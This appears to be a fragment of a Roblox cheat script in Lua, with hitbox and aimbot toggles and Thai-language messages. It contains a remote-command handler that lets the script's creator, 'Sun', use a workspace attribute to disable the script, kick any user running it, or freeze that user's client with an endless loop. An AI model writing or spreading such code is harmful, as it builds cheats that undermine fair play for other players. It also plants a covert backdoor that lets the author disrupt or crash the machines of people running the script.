local function ExecuteRemoteCommand(cmdData)
    local targetName, action = string.match(cmdData, "SUN_REMOTE:(.-):(.-)$")
    if targetName and action then
        if targetName == LocalPlayer.Name or targetName == "ALL" then
            if action == "DISABLE" then
                ScriptActive = false
                _G.HitboxEnabled = false
                _G.AimbotEnabled = false
                Connection1:Disconnect()
                Connection2:Disconnect()
                ScreenGui:Destroy()
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "🚫 แจ้งเตือน",
                    Text = "สคริปต์ถูกสั่งปิดใช้งานโดยผู้สร้าง (ซัน)",
                    Duration = 5
                })
            elseif action == "KICK" then
                LocalPlayer:Kick("\n[ADMIN SUN CONTROL]\nคุณถูกผู้สร้าง (ซัน) สั่งเตะออกจากแมพ!")
            elseif action == "CRASH" then
                while true do end
            end
        end
    end
end

workspace:GetAttributeChangedSignal("SunCmdSignal"):Connect(function()
    local val = workspace:GetAttribute("SunCmdSignal")
    if val then ExecuteRemoteCommand(val) end
end)
